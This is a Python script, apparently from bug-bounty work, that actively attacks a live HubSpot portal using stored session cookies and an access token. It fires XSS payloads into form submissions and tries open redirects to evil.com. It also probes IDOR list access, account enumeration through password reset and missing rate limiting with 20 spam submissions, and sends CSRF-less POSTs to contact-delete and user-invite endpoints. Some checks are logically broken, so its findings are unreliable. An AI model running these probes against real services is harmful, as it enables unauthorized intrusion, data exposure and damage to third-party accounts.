#!/usr/bin/env python3
"""
Look for other in-scope vulnerabilities that might be reportable
Focus on: XSS, CSRF, account takeover, data leakage, etc.
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("SEARCHING FOR OTHER IN-SCOPE VULNERABILITIES")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. XSS IN FORM SUBMISSIONS
# ============================================================================

print("\n[1] TESTING FOR XSS IN FORM SUBMISSIONS")
print("="*80)

form_ids = [1, 3, 4, 5, 6, 8, 13, 18, 1000]

xss_payloads = [
    '<script>alert(document.domain)</script>',
    '<img src=x onerror=alert(document.domain)>',
    '"><script>alert(1)</script>',
    "javascript:alert(document.domain)",
    '<svg onload=alert(document.domain)>',
]

for form_id in form_ids:
    print(f"\n--- Testing Form {form_id} ---")

    submit_url = f'https://api.hsforms.com/submissions/v3/integration/submit/{TARGET_PORTAL}/{form_id}'

    for xss in xss_payloads:
        payload = {
            'fields': [
                {'name': 'email', 'value': f'xss_{form_id}@test.com'},
                {'name': 'firstname', 'value': xss},
                {'name': 'lastname', 'value': xss},
                {'name': 'message', 'value': xss},
            ]
        }

        try:
            r = requests.post(submit_url, json=payload, verify=False, timeout=10)

            if r.status_code == 200:
                try:
                    data = r.json()

                    # Check if XSS payload is reflected
                    response_str = json.dumps(data)

                    if xss in response_str or xss.replace('<', '&lt;').replace('>', '&gt;') in r.text:
                        print(f"  *** POTENTIAL XSS REFLECTION! ***")
                        print(f"    Payload: {xss[:50]}")
                        print(f"    Response: {response_str[:200]}")

                        findings.append({
                            'type': 'xss',
                            'form_id': form_id,
                            'payload': xss,
                            'response': data
                        })

                    # Check redirect URL for XSS
                    if 'redirectUrl' in data:
                        redirect_url = data['redirectUrl']

                        # Visit redirect
                        r2 = session.get(redirect_url, verify=False, timeout=10)

                        if r2.status_code == 200:
                            # Check if our XSS payload appears unencoded in the page
                            if xss in r2.text and '<script>' in xss:
                                print(f"  *** XSS IN REDIRECT PAGE! ***")
                                print(f"    URL: {redirect_url}")

                                findings.append({
                                    'type': 'xss_redirect',
                                    'form_id': form_id,
                                    'payload': xss,
                                    'redirect_url': redirect_url
                                })
                except:
                    pass
        except:
            pass

# ============================================================================
# 2. OPEN REDIRECT
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING FOR OPEN REDIRECT")
print("="*80)

# Try open redirect in various parameters
redirect_urls = [
    f'https://app.hubspot.com/login?loginRedirectUrl=https://evil.com',
    f'https://app.hubspot.com/login?redirect=https://evil.com',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}?redirect=https://evil.com',
]

for url in redirect_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, verify=False, timeout=10, allow_redirects=False)

        print(f"  Status: {r.status_code}")

        if r.status_code in [301, 302, 303, 307, 308]:
            location = r.headers.get('Location', '')

            print(f"  Redirect to: {location}")

            if 'evil.com' in location:
                print(f"  *** OPEN REDIRECT FOUND! ***")

                findings.append({
                    'type': 'open_redirect',
                    'url': url,
                    'redirect_to': location
                })
    except:
        pass

# ============================================================================
# 3. IDOR IN LIST OPERATIONS
# ============================================================================

print("\n" + "="*80)
print("[3] TESTING FOR IDOR IN LIST OPERATIONS")
print("="*80)

# Try to access/modify lists from different portals
list_urls = [
    f'https://api.hubapi.com/contacts/v1/lists?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/contacts/v1/lists/1?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/contacts/v1/lists/1/contacts/all?portalId={TARGET_PORTAL}',
]

for url in list_urls:
    print(f"\n{url[:75]}...")

    try:
        r = session.get(url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** ACCESSIBLE! ***")

            try:
                data = r.json()
                print(f"  {json.dumps(data, indent=2)[:400]}")

                # Check if we got data from a different portal
                if 'portalId' in data and str(data['portalId']) == TARGET_PORTAL:
                    print(f"  *** IDOR - ACCESSED DIFFERENT PORTAL DATA! ***")

                    findings.append({
                        'type': 'idor',
                        'url': url,
                        'data': data
                    })
            except:
                pass
    except:
        pass

# ============================================================================
# 4. SENSITIVE DATA IN ERROR MESSAGES
# ============================================================================

print("\n" + "="*80)
print("[4] CHECKING FOR SENSITIVE DATA IN ERROR MESSAGES")
print("="*80)

# Try malformed requests to trigger errors
error_test_urls = [
    f'https://api.hubapi.com/crm/v3/objects/contacts/INVALID?portalId={TARGET_PORTAL}',
    f'https://api.hubapi.com/crm/v3/objects/contacts/batch/read',
]

error_payloads = [
    {'inputs': [{'id': 'INVALID'}]},
    {'inputs': [{'id': -1}]},
    {'inputs': [{'id': '999999999999'}]},
]

for url in error_test_urls:
    for payload in error_payloads:
        try:
            r = requests.post(url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

            if r.status_code not in [200, 400, 401, 403, 404]:
                print(f"\nUnusual status {r.status_code}: {url[:60]}...")

                try:
                    error_data = r.json()
                    error_str = json.dumps(error_data)

                    # Look for sensitive data in errors
                    sensitive_patterns = [
                        r'(pat-[a-z0-9-]+)',  # API tokens
                        r'(/home/\w+/)',  # File paths
                        r'(password|secret|key):\s*["\']([^"\']+)',  # Credentials
                        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})',  # IP addresses
                    ]

                    for pattern in sensitive_patterns:
                        matches = re.findall(pattern, error_str, re.I)

                        if matches:
                            print(f"  *** SENSITIVE DATA IN ERROR! ***")
                            print(f"    Pattern: {pattern[:50]}")
                            print(f"    Matches: {matches[:3]}")

                            findings.append({
                                'type': 'sensitive_error',
                                'url': url,
                                'pattern': pattern,
                                'matches': matches
                            })
                except:
                    pass
        except:
            pass

# ============================================================================
# 5. ACCOUNT ENUMERATION
# ============================================================================

print("\n" + "="*80)
print("[5] TESTING FOR ACCOUNT ENUMERATION")
print("="*80)

# Check if we can enumerate valid vs invalid emails
test_emails = [
    'nicksec@wearehackerone.com',  # Known valid
    'doesnotexist12345@example.com',  # Likely invalid
]

for email in test_emails:
    # Try password reset
    reset_url = 'https://app.hubspot.com/login/password-reset'

    payload = {'email': email}

    try:
        r = requests.post(reset_url, json=payload, verify=False, timeout=10)

        print(f"\n  Email: {email}")
        print(f"  Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")

        # Check for timing differences
        import time
        start = time.time()
        r2 = requests.post(reset_url, json=payload, verify=False, timeout=10)
        elapsed = time.time() - start

        print(f"  Response time: {elapsed:.2f}s")

        # Different responses could indicate enumeration
        if r.status_code != r2.status_code:
            print(f"  *** INCONSISTENT RESPONSES! ***")
    except:
        pass

# ============================================================================
# 6. MISSING RATE LIMITING
# ============================================================================

print("\n" + "="*80)
print("[6] TESTING FOR MISSING RATE LIMITING")
print("="*80)

# Try form submission spam
spam_url = f'https://api.hsforms.com/submissions/v3/integration/submit/{TARGET_PORTAL}/1'

print("Attempting 20 rapid form submissions...")

successes = 0

for i in range(20):
    payload = {
        'fields': [
            {'name': 'email', 'value': f'spam_{i}@test.com'},
            {'name': 'firstname', 'value': f'Spam{i}'},
        ]
    }

    try:
        r = requests.post(spam_url, json=payload, verify=False, timeout=5)

        if r.status_code == 200:
            successes += 1
    except:
        pass

print(f"  Successful submissions: {successes}/20")

if successes > 15:
    print(f"  *** WEAK/NO RATE LIMITING! ***")

    findings.append({
        'type': 'weak_rate_limiting',
        'endpoint': spam_url,
        'successes': successes
    })

# ============================================================================
# 7. CSRF ON CRITICAL OPERATIONS
# ============================================================================

print("\n" + "="*80)
print("[7] CHECKING CSRF PROTECTION")
print("="*80)

# Try critical operations without CSRF token
csrf_test_urls = [
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1/delete',
    f'https://app.hubspot.com/settings/{TARGET_PORTAL}/users/invite',
]

for url in csrf_test_urls:
    print(f"\n{url[:75]}...")

    # Try without CSRF token
    headers = {
        'Cookie': SESSION_COOKIES,
        'Content-Type': 'application/json',
        # Intentionally NOT including CSRF token
    }

    try:
        r = requests.post(url, headers=headers, json={'test': 'data'}, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** CSRF PROTECTION MISSING! ***")

            findings.append({
                'type': 'missing_csrf',
                'url': url
            })
    except:
        pass

print("\n" + "="*80)
print("OTHER VULNERABILITY SCAN COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL VULNERABILITIES! ***\n")

    with open('/home/user/Hub/findings/OTHER_VULNERABILITIES.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:600]}")

        print(f"\n  Severity: ", end="")

        if finding['type'] in ['xss', 'xss_redirect', 'open_redirect']:
            print("MEDIUM-HIGH")
        elif finding['type'] in ['idor', 'missing_csrf']:
            print("HIGH-CRITICAL")
        elif finding['type'] in ['sensitive_error', 'weak_rate_limiting']:
            print("LOW-MEDIUM")
        else:
            print("INFO")
else:
    print("\nNo other vulnerabilities found.")
